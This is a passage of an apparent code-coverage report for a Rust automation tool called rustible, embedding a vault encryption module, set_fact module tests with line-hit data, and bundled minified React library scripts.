vault encrypted\n    pub fn is_encrypted(content: \u0026str) -\u003e bool {\n        content.starts_with(\"$RUSTIBLE_VAULT\")\n    }\n\n    fn derive_key(\u0026self, salt: \u0026SaltString) -\u003e Result\u003cGenericArray\u003cu8, typenum::U32\u003e\u003e {\n        let argon2 = Argon2::default();\n        let mut key = [0u8; 32];\n        argon2\n            .hash_password_into(self.password.as_bytes(), salt.as_str().as_bytes(), \u0026mut key)\n            .map_err(|e| Error::Vault(format!(\"Key derivation failed: {}\", e)))?;\n        Ok(GenericArray::clone_from_slice(\u0026key))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_vault_encryption_decryption() {\n        let vault = Vault::new(\"secret_password\");\n        let content = \"sensitive data\";\n\n        let encrypted = vault.encrypt(content).unwrap();\n        assert!(Vault::is_encrypted(\u0026encrypted));\n        assert_ne!(content, encrypted);\n\n        let decrypted = vault.decrypt(\u0026encrypted).unwrap();\n        assert_eq!(content, decrypted);\n    }\n\n    #[test]\n    fn test_vault_wrong_password() {\n        let vault1 = Vault::new(\"password_one\");\n        let vault2 = Vault::new(\"password_two\");\n        let content = \"sensitive data\";\n\n        let encrypted = vault1.encrypt(content).unwrap();\n        let result = vault2.decrypt(\u0026encrypted);\n\n        assert!(result.is_err());\n    }\n}\n","traces":[{"line":24,"address":[29557344],"length":1,"stats":{"Line":1}},{"line":26,"address":[29557367],"length":1,"stats":{"Line":1}},{"line":31,"address":[31671072,31672533,31672555],"length":1,"stats":{"Line":1}},{"line":32,"address":[31671128],"length":1,"stats":{"Line":1}},{"line":33,"address":[31671151],"length":1,"stats":{"Line":1}},{"line":35,"address":[31671337],"length":1,"stats":{"Line":1}},{"line":37,"address":[31671362],"length":1,"stats":{"Line":1}},{"line":38,"address":[31671385],"length":1,"stats":{"Line":1}},{"line":39,"address":[31671474],"length":1,"stats":{"Line":1}},{"line":41,"address":[31671758,31671603],"length":1,"stats":{"Line":1}},{"line":42,"address":[31671509],"length":1,"stats":{"Line":1}},{"line":43,"address":[29558208,29558192],"length":1,"stats":{"Line":1}},{"line":45,"address":[31671847],"length":1,"stats":{"Line":1}},{"line":46,"address":[31671987,31671910],"length":1,"stats":{"Line":2}},{"line":47,"address":[31672033],"length":1,"stats":{"Line":1}},{"line":48,"address":[31672057],"length":1,"stats":{"Line":1}},{"line":49,"address":[31672089],"length":1,"stats":{"Line":1}},{"line":51,"address":[31672147],"length":1,"stats":{"Line":1}},{"line":55,"address":[31670888,31671053,31667856],"length":1,"stats":{"Line":1}},{"line":56,"address":[31667949],"length":1,"stats":{"Line":1}},{"line":57,"address":[31668177,31668084,31668015],"length":1,"stats":{"Line":3}},{"line":58,"address":[31670974,31668128],"length":1,"stats":{"Line":0}},{"line":61,"address":[31670964,31668542,31668384],"length":1,"stats":{"Line":1}},{"line":62,"address":[31668227],"length":1,"stats":{"Line":1}},{"line":63,"address":[29557536,29557553],"length":1,"stats":{"Line":1}},{"line":66,"address":[31668631,31669009,31670946,31668769,31668851],"length":1,"stats":{"Line":3}},{"line":68,"address":[31668793],"length":1,"stats":{"Line":3}},{"line":69,"address":[29557712,29557726],"length":1,"stats":{"Line":1}},{"line":70,"address":[31669159,31669317,31669055,31670944],"length":1,"stats":{"Line":2}},{"line":71,"address":[29558110,29558096],"length":1,"stats":{"Line":1}},{"line":72,"address":[29557440,29557454],"length":1,"stats":{"Line":1}},{"line":75,"address":[31669676,31669725],"length":1,"stats":{"Line":1}},{"line":76,"address":[31669706,31669755],"length":1,"stats":{"Line":2}},{"line":77,"address":[31669849],"length":1,"stats":{"Line":1}},{"line":79,"address":[31669994,31670940],"length":1,"stats":{"Line":1}},{"line":80,"address":[31670264],"length":1,"stats":{"Line":1}},{"line":82,"address":[31670570,31670412],"length":1,"stats":{"Line":2}},{"line":83,"address":[31670322],"length":1,"stats":{"Line":1}},{"line":84,"address":[29557808,29557822],"length":1,"stats":{"Line":4}},{"line":86,"address":[31670667],"length":1,"stats":{"Line":1}},{"line":87,"address":[29557936,29557954],"length":1,"stats":{"Line":1}},{"line":91,"address":[31667808],"length":1,"stats":{"Line":1}},{"line":92,"address":[31667822],"length":1,"stats":{"Line":1}},{"line":95,"address":[31667424],"length":1,"stats":{"Line":1}},{"line":96,"address":[31667467],"length":1,"stats":{"Line":1}},{"line":97,"address":[31667478],"length":1,"stats":{"Line":1}},{"line":98,"address":[31667599,31667678],"length":1,"stats":{"Line":1}},{"line":99,"address":[31667503],"length":1,"stats":{"Line":1}},{"line":100,"address":[29557175,29557152],"length":1,"stats":{"Line":1}},{"line":101,"address":[31667700],"length":1,"stats":{"Line":1}}],"covered":49,"coverable":50},{"path":["/","home","artur","Repositories","rustible","test_set_fact_simple.rs"],"content":"// Simple test to verify set_fact module functionality\n// This can be run with: cargo test --test test_set_fact_simple\n\n#[cfg(test)]\nmod tests {\n    use rustible::executor::runtime::RuntimeContext;\n    use rustible::modules::set_fact::SetFactModule;\n    use rustible::modules::{Module, ModuleContext, ModuleParams};\n    use serde_json::Value;\n    use std::collections::HashMap;\n\n    #[test]\n    fn test_set_fact_basic() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"test_var\".to_string(), Value::String(\"test_value\".to_string()));\n        params.insert(\"test_num\".to_string(), Value::Number(42.into()));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"Set 2 facts\"));\n        assert_eq!(result.data.get(\"test_var\"), Some(\u0026Value::String(\"test_value\".to_string())));\n        assert_eq!(result.data.get(\"test_num\"), Some(\u0026Value::Number(42.into())));\n    }\n\n    #[test]\n    fn test_set_fact_runtime_integration() {\n        let mut runtime = RuntimeContext::new();\n        runtime.add_host(\"testhost\".to_string(), None);\n\n        // Simulate set_fact behavior\n        runtime.set_host_fact(\"testhost\", \"my_fact\".to_string(), Value::String(\"my_value\".to_string()));\n\n        // Verify the fact is set\n        let merged = runtime.get_merged_vars(\"testhost\");\n        assert_eq!(merged.get(\"my_fact\"), Some(\u0026Value::String(\"my_value\".to_string())));\n    }\n\n    #[test]\n    fn test_set_fact_persistence() {\n        let mut runtime = RuntimeContext::new();\n        runtime.add_host(\"testhost\".to_string(), None);\n\n        // Set multiple facts\n        runtime.set_host_fact(\"testhost\", \"fact1\".to_string(), Value::String(\"value1\".to_string()));\n        runtime.set_host_fact(\"testhost\", \"fact2\".to_string(), Value::Number(100.into()));\n        runtime.set_host_fact(\"testhost\", \"fact3\".to_string(), Value::Bool(true));\n\n        // Verify all facts persist\n        let merged = runtime.get_merged_vars(\"testhost\");\n        assert_eq!(merged.get(\"fact1\"), Some(\u0026Value::String(\"value1\".to_string())));\n        assert_eq!(merged.get(\"fact2\"), Some(\u0026Value::Number(100.into())));\n        assert_eq!(merged.get(\"fact3\"), Some(\u0026Value::Bool(true)));\n    }\n\n    #[test]\n    fn test_set_fact_complex_types() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n\n        // Dictionary\n        let dict = serde_json::json!({\n            \"key1\": \"value1\",\n            \"key2\": 42\n        });\n        params.insert(\"my_dict\".to_string(), dict.clone());\n\n        // Array\n        let array = serde_json::json!([\"item1\", \"item2\"]);\n        params.insert(\"my_array\".to_string(), array.clone());\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"my_dict\"));\n        assert!(result.data.contains_key(\"my_array\"));\n    }\n\n    #[test]\n    fn test_set_fact_cacheable() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cached_var\".to_string(), Value::String(\"cached\".to_string()));\n        params.insert(\"cacheable\".to_string(), Value::Bool(true));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"cached_var\"));\n        assert_eq!(result.data.get(\"cacheable\"), Some(\u0026Value::Bool(true)));\n    }\n\n    #[test]\n    fn test_set_fact_validation_requires_facts() {\n        let module = SetFactModule;\n        let params: ModuleParams = HashMap::new();\n\n        assert!(module.validate_params(\u0026params).is_err());\n    }\n\n    #[test]\n    fn test_set_fact_validation_cacheable_only_fails() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cacheable\".to_string(), Value::Bool(true));\n\n        assert!(module.validate_params(\u0026params).is_err());\n    }\n}\n","traces":[],"covered":0,"coverable":0}]};
        var previousData = null;
    </script>
    <script crossorigin>/** @license React v16.13.1
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
'use strict';(function(d,r){"object"===typeof exports&&"undefined"!==typeof module?r(exports):"function"===typeof define&&define.amd?define(["exports"],r):(d=d||self,r(d.React={}))})(this,function(d){function r(a){for(var b="https://reactjs.org/docs/error-decoder.html?invariant="+a,c=1;c<arguments.length;c++)b+="&args[]="+encodeURIComponent(arguments[c]);return"Minified React error #"+a+"; visit "+b+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}
function w(a,b,c){this.props=a;this.context=b;this.refs=ba;this.updater=c||ca}function da(){}function L(a,b,c){this.props=a;this.context=b;this.refs=ba;this.updater=c||ca}function ea(a,b,c){var g,e={},fa=null,d=null;if(null!=b)for(g in void 0!==b.ref&&(d=b.ref),void 0!==b.key&&(fa=""+b.key),b)ha.call(b,g)&&!ia.hasOwnProperty(g)&&(e[g]=b[g]);var h=arguments.length-2;if(1===h)e.children=c;else if(1<h){for(var k=Array(h),f=0;f<h;f++)k[f]=arguments[f+2];e.children=k}if(a&&a.defaultProps)for(g in h=a.defaultProps,
h)void 0===e[g]&&(e[g]=h[g]);return{$$typeof:x,type:a,key:fa,ref:d,props:e,_owner:M.current}}function va(a,b){return{$$typeof:x,type:a.type,key:b,ref:a.ref,props:a.props,_owner:a._owner}}function N(a){return"object"===typeof a&&null!==a&&a.$$typeof===x}function wa(a){var b={"=":"=0",":":"=2"};return"$"+(""+a).replace(/[=:]/g,function(a){return b[a]})}function ja(a,b,c,g){if(C.length){var e=C.pop();e.result=a;e.keyPrefix=b;e.func=c;e.context=g;e.count=0;return e}return{result:a,keyPrefix:b,func:c,
context:g,count:0}}function ka(a){a.result=null;a.keyPrefix=null;a.func=null;a.context=null;a.count=0;10>C.length&&C.push(a)}function O(a,b,c,g){var e=typeof a;if("undefined"===e||"boolean"===e)a=null;var d=!1;if(null===a)d=!0;else switch(e){case "string":case "number":d=!0;break;case "object":switch(a.$$typeof){case x:case xa:d=!0}}if(d)return c(g,a,""===b?"."+P(a,0):b),1;d=0;b=""===b?".":b+":";if(Array.isArray(a))for(var f=0;f<a.length;f++){e=a[f];var h=b+P(e,f);d+=O(e,h,c,g)}else if(null===a||
"object"!==typeof a?h=null:(h=la&&a[la]||a["@@iterator"],h="function"===typeof h?h:null),"function"===typeof h)for(a=h.call(a),f=0;!(e=a.next()).done;)e=e.value,h=b+P(e,f++),d+=O(e,h,c,g);else if("object"===e)throw c=""+a,Error(r(31,"[object Object]"===c?"object with keys {"+Object.keys(a).join(", ")+"}":c,""));return d}function Q(a,b,c){return null==a?0:O(a,"",b,c)}function P(a,b){return"object"===typeof a&&null!==a&&null!=a.key?wa(a.key):b.toString(36)}function ya(a,b,c){a.func.call(a.context,b,
a.count++)}function za(a,b,c){var g=a.result,e=a.keyPrefix;a=a.func.call(a.context,b,a.count++);Array.isArray(a)?R(a,g,c,function(a){return a}):null!=a&&(N(a)&&(a=va(a,e+(!a.key||b&&b.key===a.key?"":(""+a.key).replace(ma,"$&/")+"/")+c)),g.push(a))}function R(a,b,c,g,e){var d="";null!=c&&(d=(""+c).replace(ma,"$&/")+"/");b=ja(b,d,g,e);Q(a,za,b);ka(b)}function t(){var a=na.current;if(null===a)throw Error(r(321));return a}function S(a,b){var c=a.length;a.push(b);a:for(;;){var g=c-1>>>1,e=a[g];if(void 0!==
e&&0<D(e,b))a[g]=b,a[c]=e,c=g;else break a}}function n(a){a=a[0];return void 0===a?null:a}function E(a){var b=a[0];if(void 0!==b){var c=a.pop();if(c!==b){a[0]=c;a:for(var g=0,e=a.length;g<e;){var d=2*(g+1)-1,f=a[d],h=d+1,k=a[h];if(void 0!==f&&0>D(f,c))void 0!==k&&0>D(k,f)?(a[g]=k,a[h]=c,g=h):(a[g]=f,a[d]=c,g=d);else if(void 0!==k&&0>D(k,c))a[g]=k,a[h]=c,g=h;else break a}}return b}return null}function D(a,b){var c=a.sortIndex-b.sortIndex;return 0!==c?c:a.id-b.id}function F(a){for(var b=n(u);null!==
b;){if(null===b.callback)E(u);else if(b.startTime<=a)E(u),b.sortIndex=b.expirationTime,S(p,b);else break;b=n(u)}}function T(a){y=!1;F(a);if(!v)if(null!==n(p))v=!0,z(U);else{var b=n(u);null!==b&&G(T,b.startTime-a)}}function U(a,b){v=!1;y&&(y=!1,V());H=!0;var c=m;try{F(b);for(l=n(p);null!==l&&(!(l.expirationTime>b)||a&&!W());){var g=l.callback;if(null!==g){l.callback=null;m=l.priorityLevel;var e=g(l.expirationTime<=b);b=q();"function"===typeof e?l.callback=e:l===n(p)&&E(p);F(b)}else E(p);l=n(p)}if(null!==
l)var d=!0;else{var f=n(u);null!==f&&G(T,f.startTime-b);d=!1}return d}finally{l=null,m=c,H=!1}}function oa(a){switch(a){case 1:return-1;case 2:return 250;case 5:return 1073741823;case 4:return 1E4;default:return 5E3}}var f="function"===typeof Symbol&&Symbol.for,x=f?Symbol.for("react.element"):60103,xa=f?Symbol.for("react.portal"):60106,Aa=f?Symbol.for("react.fragment"):60107,Ba=f?Symbol.for("react.strict_mode"):60108,Ca=f?Symbol.for("react.profiler"):60114,Da=f?Symbol.for("react.provider"):60109,
Ea=f?Symbol.for("react.context"):60110,Fa=f?Symbol.for("react.forward_ref"):60112,Ga=f?Symbol.for("react.suspense"):60113,Ha=f?Symbol.for("react.memo"):60115,Ia=f?Symbol.for("react.lazy"):60116,la="function"===typeof Symbol&&Symbol.iterator,pa=Object.getOwnPropertySymbols,Ja=Object.prototype.hasOwnProperty,Ka=Object.prototype.propertyIsEnumerable,I=function(){try{if(!Object.assign)return!1;var a=new String("abc");a[5]="de";if("5"===Object.getOwnPropertyNames(a)[0])return!1;var b={};for(a=0;10>a;a++)b["_"+
String.fromCharCode(a)]=a;if("0123456789"!==Object.getOwnPropertyNames(b).map(function(a){return b[a]}).join(""))return!1;var c={};"abcdefghijklmnopqrst".split("").forEach(function(a){c[a]=a});return"abcdefghijklmnopqrst"!==Object.keys(Object.assign({},c)).join("")?!1:!0}catch(g){return!1}}()?Object.assign:function(a,b){if(null===a||void 0===a)throw new TypeError("Object.assign cannot be called with null or undefined");var c=Object(a);for(var g,e=1;e<arguments.length;e++){var d=Object(arguments[e]);
for(var f in d)Ja.call(d,f)&&(c[f]=d[f]);if(pa){g=pa(d);for(var h=0;h<g.length;h++)Ka.call(d,g[h])&&(c[g[h]]=d[g[h]])}}return c},ca={isMounted:function(a){return!1},enqueueForceUpdate:function(a,b,c){},enqueueReplaceState:function(a,b,c,d){},enqueueSetState:function(a,b,c,d){}},ba={};w.prototype.isReactComponent={};w.prototype.setState=function(a,b){if("object"!==typeof a&&"function"!==typeof a&&null!=a)throw Error(r(85));this.updater.enqueueSetState(this,a,b,"setState")};w.prototype.forceUpdate=
function(a){this.updater.enqueueForceUpdate(this,a,"forceUpdate")};da.prototype=w.prototype;f=L.prototype=new da;f.constructor=L;I(f,w.prototype);f.isPureReactComponent=!0;var M={current:null},ha=Object.prototype.hasOwnProperty,ia={key:!0,ref:!0,__self:!0,__source:!0},ma=/\/+/g,C=[],na={current:null},X;if("undefined"===typeof window||"function"!==typeof MessageChannel){var A=null,qa=null,ra=function(){if(null!==A)try{var a=q();A(!0,a);A=null}catch(b){throw setTimeout(ra,0),b;}},La=Date.now();var q=
function(){return Date.now()-La};var z=function(a){null!==A?setTimeout(z,0,a):(A=a,setTimeout(ra,0))};var G=function(a,b){qa=setTimeout(a,b)};var V=function(){clearTimeout(qa)};var W=function(){return!1};f=X=function(){}}else{var Y=window.performance,sa=window.Date,Ma=window.setTimeout,Na=window.clearTimeout;"undefined"!==typeof console&&(f=window.cancelAnimationFrame,"function"!==typeof window.requestAnimationFrame&&console.error("This browser doesn't support requestAnimationFrame. Make sure that you load a polyfill in older browsers. https://fb.me/react-polyfills"),
"function"!==typeof f&&console.error("This browser doesn't support cancelAnimationFrame. Make sure that you load a polyfill in older browsers. https://fb.me/react-polyfills"));if("object"===typeof Y&&"function"===typeof Y.now)q=function(){return Y.now()};else{var Oa=sa.now();q=function(){return sa.now()-Oa}}var J=!1,K=null,Z=-1,ta=5,ua=0;W=function(){return q()>=ua};f=function(){};X=function(a){0>a||125<a?console.error("forceFrameRate takes a positive int between 0 and 125, forcing framerates higher than 125 fps is not unsupported"):
ta=0<a?Math.floor(1E3/a):5};var B=new MessageChannel,aa=B.port2;B.port1.onmessage=function(){if(null!==K){var a=q();ua=a+ta;try{K(!0,a)?aa.postMessage(null):(J=!1,K=null)}catch(b){throw aa.postMessage(null),b;}}else J=!1};z=function(a){K=a;J||(J=!0,aa.postMessage(null))};G=function(a,b){Z=Ma(function(){a(q())},b)};V=function(){Na(Z);Z=-1}}var p=[],u=[],Pa=1,l=null,m=3,H=!1,v=!1,y=!1,Qa=0;B={ReactCurrentDispatcher:na,ReactCurrentOwner:M,IsSomeRendererActing:{current:!1},assign:I};I(B,{Scheduler:{__proto__:null,
unstable_ImmediatePriority:1,unstable_UserBlockingPriority:2,unstable_NormalPriority:3,unstable_IdlePriority:5,unstable_LowPriority:4,unstable_runWithPriority:function(a,b){switch(a){case 1:case 2:case 3:case 4:case 5:break;default:a=3}var c=m;m=a;try{return b()}finally{m=c}},unstable_next:function(a){switch(m){case 1:case 2:case 3:var b=3;break;default:b=m}var c=m;m=b;try{return a()}finally{m=c}},unstable_scheduleCallback:function(a,b,c){var d=q();if("object"===typeof c&&null!==c){var e=c.delay;
e="number"===typeof e&&0<e?d+e:d;c="number"===typeof c.timeout?c.timeout:oa(a)}else c=oa(a),e=d;c=e+c;a={id:Pa++,callback:b,priorityLevel:a,startTime:e,expirationTime:c,sortIndex:-1};e>d?(a.sortIndex=e,S(u,a),null===n(p)&&a===n(u)&&(y?V():y=!0,G(T,e-d))):(a.sortIndex=c,S(p,a),v||H||(v=!0,z(U)));return a},unstable_cancelCallback:function(a){a.callback=null},unstable_wrapCallback:function(a){var b=m;return function(){var c=m;m=b;try{return a.apply(this,arguments)}finally{m=c}}},unstable_getCurrentPriorityLevel:function(){return m},
unstable_shouldYield:function(){var a=q();F(a);var b=n(p);return b!==l&&null!==l&&null!==b&&null!==b.callback&&b.startTime<=a&&b.expirationTime<l.expirationTime||W()},unstable_requestPaint:f,unstable_continueExecution:function(){v||H||(v=!0,z(U))},unstable_pauseExecution:function(){},unstable_getFirstCallbackNode:function(){return n(p)},get unstable_now(){return q},get unstable_forceFrameRate(){return X},unstable_Profiling:null},SchedulerTracing:{__proto__:null,__interactionsRef:null,__subscriberRef:null,
unstable_clear:function(a){return a()},unstable_getCurrent:function(){return null},unstable_getThreadID:function(){return++Qa},unstable_trace:function(a,b,c){return c()},unstable_wrap:function(a){return a},unstable_subscribe:function(a){},unstable_unsubscribe:function(a){}}});d.Children={map:function(a,b,c){if(null==a)return a;var d=[];R(a,d,null,b,c);return d},forEach:function(a,b,c){if(null==a)return a;b=ja(null,null,b,c);Q(a,ya,b);ka(b)},count:function(a){return Q(a,function(){return null},null)},
toArray:function(a){var b=[];R(a,b,null,function(a){return a});return b},only:function(a){if(!N(a))throw Error(r(143));return a}};d.Component=w;d.Fragment=Aa;d.Profiler=Ca;d.PureComponent=L;d.StrictMode=Ba;d.Suspense=Ga;d.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=B;d.cloneElement=function(a,b,c){if(null===a||void 0===a)throw Error(r(267,a));var d=I({},a.props),e=a.key,f=a.ref,m=a._owner;if(null!=b){void 0!==b.ref&&(f=b.ref,m=M.current);void 0!==b.key&&(e=""+b.key);if(a.type&&a.type.defaultProps)var h=
a.type.defaultProps;for(k in b)ha.call(b,k)&&!ia.hasOwnProperty(k)&&(d[k]=void 0===b[k]&&void 0!==h?h[k]:b[k])}var k=arguments.length-2;if(1===k)d.children=c;else if(1<k){h=Array(k);for(var l=0;l<k;l++)h[l]=arguments[l+2];d.children=h}return{$$typeof:x,type:a.type,key:e,ref:f,props:d,_owner:m}};d.createContext=function(a,b){void 0===b&&(b=null);a={$$typeof:Ea,_calculateChangedBits:b,_currentValue:a,_currentValue2:a,_threadCount:0,Provider:null,Consumer:null};a.Provider={$$typeof:Da,_context:a};return a.Consumer=
a};d.createElement=ea;d.createFactory=function(a){var b=ea.bind(null,a);b.type=a;return b};d.createRef=function(){return{current:null}};d.forwardRef=function(a){return{$$typeof:Fa,render:a}};d.isValidElement=N;d.lazy=function(a){return{$$typeof:Ia,_ctor:a,_status:-1,_result:null}};d.memo=function(a,b){return{$$typeof:Ha,type:a,compare:void 0===b?null:b}};d.useCallback=function(a,b){return t().useCallback(a,b)};d.useContext=function(a,b){return t().useContext(a,b)};d.useDebugValue=function(a,b){};
d.useEffect=function(a,b){return t().useEffect(a,b)};d.useImperativeHandle=function(a,b,c){return t().useImperativeHandle(a,b,c)};d.useLayoutEffect=function(a,b){return t().useLayoutEffect(a,b)};d.useMemo=function(a,b){return t().useMemo(a,b)};d.useReducer=function(a,b,c){return t().useReducer(a,b,c)};d.useRef=function(a){return t().useRef(a)};d.useState=function(a){return t().useState(a)};d.version="16.13.1"});
</script>
    <script crossorigin>/** @license React v16.13.1
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
/*
 Modernizr 3.0.0pre (Custom Build) | MIT
*/
'use strict';(function(I,ea){"object"===typeof exports&&"undefined"!==typeof module?ea(exports,require("react")):"function"===typeof define&&define.amd?define(["exports","react"],ea):(I=I||self,ea(I.ReactDOM={},I.React))})(this,function(I,ea){function k(a){for(var b="https://reactjs.org/docs/error-decoder.html?invariant="+a,c=1;c<arguments.length;c++)b+="&args[]="+encodeURIComponent(arguments[c]);return"Minified React error #"+a+"; visit "+b+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}
function ji(a,b,c,d,e,f,g,h,m){yb=!1;gc=null;ki.apply(li,arguments)}function mi(a,b,c,d,e,f,g,h,m){ji.apply(this,arguments);if(yb){if(yb){var n=gc;yb=!1;gc=null}else throw Error(k(198));hc||(hc=!0,pd=n)}}function lf(a,b,c){var d=a.type||"unknown-event";a.currentTarget=mf(c);mi(d,b,void 0,a);a.currentTarget=null}function nf(){if(ic)for(var a in cb){var b=cb[a],c=ic.indexOf(a);if(!(-1<c))throw Error(k(96,a));if(!jc[c]){if(!b.extractEvents)throw Error(k(97,a));jc[c]=b;c=b.eventTypes;for(var d in c){var e=
void 0;var f=c[d],g=b,h=d;if(qd.hasOwnProperty(h))throw Error(k(99,h));qd[h]=f;var m=f.phasedRegistrationNames;if(m){for(e in m)m.hasOwnProperty(e)&&of(m[e],g,h);e=!0}else f.registrationName?(of(f.registrationName,g,h),e=!0):e=!1;if(!e)throw Error(k(98,d,a));}}}}function of(a,b,c){if(db[a])throw Error(k(100,a));db[a]=b;rd[a]=b.eventTypes[c].dependencies}function pf(a){var b=!1,c;for(c in a)if(a.hasOwnProperty(c)){var d=a[c];if(!cb.hasOwnProperty(c)||cb[c]!==d){if(cb[c])throw Error(k(102,c));cb[c]=
d;b=!0}}b&&nf()}function qf(a){if(a=rf(a)){if("function"!==typeof sd)throw Error(k(280));var b=a.stateNode;b&&(b=td(b),sd(a.stateNode,a.type,b))}}function sf(a){eb?fb?fb.push(a):fb=[a]:eb=a}function tf(){if(eb){var a=eb,b=fb;fb=eb=null;qf(a);if(b)for(a=0;a<b.length;a++)qf(b[a])}}function ud(){if(null!==eb||null!==fb)vd(),tf()}function uf(a,b,c){if(wd)return a(b,c);wd=!0;try{return vf(a,b,c)}finally{wd=!1,ud()}}function ni(a){if(wf.call(xf,a))return!0;if(wf.call(yf,a))return!1;if(oi.test(a))return xf[a]=
!0;yf[a]=!0;return!1}function pi(a,b,c,d){if(null!==c&&0===c.type)return!1;switch(typeof b){case "function":case "symbol":return!0;case "boolean":if(d)return!1;if(null!==c)return!c.acceptsBooleans;a=a.toLowerCase().slice(0,5);return"data-"!==a&&"aria-"!==a;default:return!1}}function qi(a,b,c,d){if(null===b||"undefined"===typeof b||pi(a,b,c,d))return!0;if(d)return!1;if(null!==c)switch(c.type){case 3:return!b;case 4:return!1===b;case 5:return isNaN(b);case 6:return isNaN(b)||1>b}return!1}function L(a,
b,c,d,e,f){this.acceptsBooleans=2===b||3===b||4===b;this.attributeName=d;this.attributeNamespace=e;this.mustUseProperty=c;this.propertyName=a;this.type=b;this.sanitizeURL=f}function xd(a,b,c,d){var e=E.hasOwnProperty(b)?E[b]:null;var f=null!==e?0===e.type:d?!1:!(2<b.length)||"o"!==b[0]&&"O"!==b[0]||"n"!==b[1]&&"N"!==b[1]?!1:!0;f||(qi(b,c,e,d)&&(c=null),d||null===e?ni(b)&&(null===c?a.removeAttribute(b):a.setAttribute(b,""+c)):e.mustUseProperty?a[e.propertyName]=null===c?3===e.type?!1:"":c:(b=e.attributeName,
d=e.attributeNamespace,null===c?a.removeAttribute(b):(e=e.type,c=3===e||4===e&&!0===c?"":""+c,d?a.setAttributeNS(d,b,c):a.setAttribute(b,c))))}function zb(a){if(null===a||"object"!==typeof a)return null;a=zf&&a[zf]||a["@@iterator"];return"function"===typeof a?a:null}function ri(a){if(-1===a._status){a._status=0;var b=a._ctor;b=b();a._result=b;b.then(function(b){0===a._status&&(b=b.default,a._status=1,a._result=b)},function(b){0===a._status&&(a._status=2,a._result=b)})}}function na(a){if(null==a)return null;
if("function"===typeof a)return a.displayName||a.name||null;if("string"===typeof a)return a;switch(a){case Ma:return"Fragment";case gb:return"Portal";case kc:return"Profiler";case Af:return"StrictMode";case lc:return"Suspense";case yd:return"SuspenseList"}if("object"===typeof a)switch(a.$$typeof){case Bf:return"Context.Consumer";case Cf:return"Context.Provider";case zd:var b=a.render;b=b.displayName||b.name||"";return a.displayName||(""!==b?"ForwardRef("+b+")":"ForwardRef");case Ad:return na(a.type);
case Df:return na(a.render);case Ef:if(a=1===a._status?a._result:null)return na(a)}return null}function Bd(a){var b="";do{a:switch(a.tag){case 3:case 4:case 6:case 7:case 10:case 9:var c="";break a;default:var d=a._debugOwner,e=a._debugSource,f=na(a.type);c=null;d&&(c=na(d.type));d=f;f="";e?f=" (at "+e.fileName.replace(si,"")+":"+e.lineNumber+")":c&&(f=" (created by "+c+")");c="\n    in "+(d||"Unknown")+f}b+=c;a=a.return}while(a);return b}function va(a){switch(typeof a){case "boolean":case "number":case "object":case "string":case "undefined":return a;
default:return""}}function Ff(a){var b=a.type;return(a=a.nodeName)&&"input"===a.toLowerCase()&&("checkbox"===b||"radio"===b)}function ti(a){var b=Ff(a)?"checked":"value",c=Object.getOwnPropertyDescriptor(a.constructor.prototype,b),d=""+a[b];if(!a.hasOwnProperty(b)&&"undefined"!==typeof c&&"function"===typeof c.get&&"function"===typeof c.set){var e=c.get,f=c.set;Object.defineProperty(a,b,{configurable:!0,get:function(){return e.call(this)},set:function(a){d=""+a;f.call(this,a)}});Object.defineProperty(a,
b,{enumerable:c.enumerable});return{getValue:function(){return d},setValue:function(a){d=""+a},stopTracking:function(){a._valueTracker=null;delete a[b]}}}}function mc(a){a._valueTracker||(a._valueTracker=ti(a))}function Gf(a){if(!a)return!1;var b=a._valueTracker;if(!b)return!0;var c=b.getValue();var d="";a&&(d=Ff(a)?a.checked?"true":"false":a.value);a=d;return a!==c?(b.setValue(a),!0):!1}function Cd(a,b){var c=b.checked;return M({},b,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=
c?c:a._wrapperState.initialChecked})}function Hf(a,b){var c=null==b.defaultValue?"":b.defaultValue,d=null!=b.checked?b.checked:b.defaultChecked;c=va(null!=b.value?b.value:c);a._wrapperState={initialChecked:d,initialValue:c,controlled:"checkbox"===b.type||"radio"===b.type?null!=b.checked:null!=b.value}}function If(a,b){b=b.checked;null!=b&&xd(a,"checked",b,!1)}function Dd(a,b){If(a,b);var c=va(b.value),d=b.type;if(null!=c)if("number"===d){if(0===c&&""===a.value||a.value!=c)a.value=""+c}else a.value!==
""+c&&(a.value=""+c);else if("submit"===d||"reset"===d){a.removeAttribute("value");return}b.hasOwnProperty("value")?Ed(a,b.type,c):b.hasOwnProperty("defaultValue")&&Ed(a,b.type,va(b.defaultValue));null==b.checked&&null!=b.defaultChecked&&(a.defaultChecked=!!b.defaultChecked)}function Jf(a,b,c){if(b.hasOwnProperty("value")||b.hasOwnProperty("defaultValue")){var d=b.type;if(!("submit"!==d&&"reset"!==d||void 0!==b.value&&null!==b.value))return;b=""+a._wrapperState.initialValue;c||b===a.value||(a.value=
